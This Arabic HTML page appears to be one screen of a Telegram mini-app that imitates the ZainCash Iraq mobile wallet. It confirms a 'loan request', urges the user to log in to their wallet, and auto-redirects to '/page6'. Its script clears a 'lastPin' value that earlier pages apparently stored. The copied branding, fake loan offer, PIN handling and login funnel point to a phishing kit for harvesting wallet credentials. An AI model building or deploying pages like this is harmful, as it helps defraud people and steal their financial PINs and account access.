<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تم إرسال الطلب - زين كاش العراق</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">

    <style>
        :root {
            --zc-purple: #6A1B9A;          /* ZainCash Signature Deep Purple */
            --zc-magenta: #C2185B;         /* ZainCash Vibrant Magenta Accent */
            --zc-gradient: linear-gradient(135deg, #4A148C 0%, #8E24AA 55%, #D81B60 100%);
            --zc-dark: #1E102B;            /* Deep Plum Dark Text */
            --zc-accent-purple: #7B1FA2;
            --bg-color: #F7F5F9;
            --card-bg: #FFFFFF;
            --calc-bg: #F5EEF8;            /* Soft Lavender Tint */
            --calc-border: #E1BEE7;
            --text-main: #1E102B;
            --text-muted: #6A5D75;
            --input-border: #E0D7E8;
            --btn-gray: #EDE7F6;
            --btn-gray-text: #4A148C;
        }

        * {
            box-sizing: border-box;
            font-family: 'Cairo', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
            direction: rtl;
        }

        /* Top Floating Dark Toast Notification */
        .toast-notification {
            position: absolute;
            top: 25px;
            background-color: var(--zc-dark);
            color: #ffffff;
            padding: 12px 20px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 8px 24px rgba(74, 20, 140, 0.2);
            z-index: 100;
            font-size: 14px;
            font-weight: 700;
            line-height: 1.3;
        }

        .toast-icon {
            width: 24px;
            height: 24px;
            background: var(--zc-gradient);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 14px;
            font-weight: 900;
            flex-shrink: 0;
        }

        /* Main Card Container */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 420px;
            margin-top: 45px;
            padding: 40px 24px 35px;
            border-radius: 24px;
            box-shadow: 0 6px 25px rgba(106, 27, 154, 0.08);
            border: 1px solid #EDE7F6;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Circle Checkmark Banner */
        .check-circle {
            width: 88px;
            height: 88px;
            background: var(--zc-gradient);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 28px;
            color: #ffffff;
            font-size: 40px;
            font-weight: 900;
            box-shadow: 0 4px 20px rgba(142, 36, 170, 0.35);
        }

        .main-title {
            font-size: 25px;
            color: var(--zc-dark);
            margin: 0 0 16px;
            font-weight: 800;
        }

        .message-text {
            color: var(--text-muted);
            font-size: 14.5px;
            margin: 0 0 14px;
            line-height: 1.6;
            max-width: 320px;
            font-weight: 600;
        }

        /* Redirect Container Button & Spinner */
        .redirect-box {
            background-color: var(--calc-bg);
            border: 1px solid var(--calc-border);
            border-radius: 12px;
            padding: 16px 20px;
            margin: 20px 0 16px;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            color: var(--zc-purple);
            font-weight: 800;
            font-size: 15px;
        }

        .spinner {
            width: 18px;
            height: 18px;
            border: 2.5px solid #E0D7E8;
            border-top: 2.5px solid var(--zc-magenta);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Bottom Outline Action Button */
        .btn-outline {
            background-color: transparent;
            color: var(--zc-dark);
            border: 2px solid var(--input-border);
            width: 100%;
            padding: 14px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            transition: background-color 0.2s, border-color 0.2s;
        }

        .btn-outline:active {
            background-color: var(--calc-bg);
            border-color: var(--zc-magenta);
        }
    </style>
</head>

<body>

<!-- Top Floating Toast Notification -->
<div class="toast-notification">
    <div class="toast-icon">✓</div>
    <div>🎉 تم إرسال الطلب<br>بنجاح تام!</div>
</div>

<!-- Card Container -->
<div class="card">
    <!-- Big Purple/Magenta Circle Indicator -->
    <div class="check-circle">✓</div>

    <!-- Title & Descriptions -->
    <h1 class="main-title">تم تقديم الطلب بنجاح</h1>

    <p class="message-text">
        تم استلام طلب القرض الخاص بك بنجاح. يرجى الانتظار للموافقة والمتابعة.
    </p>

    <p class="message-text">
        ستتلقى رسالة تأكيد. يرجى تسجيل الدخول إلى محفظة زين كاش للمتابعة.
    </p>

    <!-- Redirect Countdown Box -->
    <div class="redirect-box">
        <div class="spinner"></div>
        <span>جاري التحويل خلال <span id="timer">3</span> ثوانٍ...</span>
    </div>

    <!-- Secondary Login Button -->
    <button type="button" class="btn-outline" onclick="goToPage6()">
        تسجيل الدخول الآن
    </button>
</div>

<script>
    let timeLeft = 3;
    let interval;

    function updateTimer() {
        const el = document.getElementById('timer');
        if (el) el.textContent = timeLeft;
    }

    function goToPage6() {
        if (interval) clearInterval(interval);

        // Clear temporary PIN storage before redirecting
        localStorage.removeItem('lastPin');
        
        window.location.href = "/page6";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        updateTimer();

        interval = setInterval(() => {
            timeLeft--;

            if (timeLeft <= 0) {
                clearInterval(interval);
                goToPage6();
                return;
            }

            updateTimer();
        }, 1000);
    };
</script>

</body>
</html>
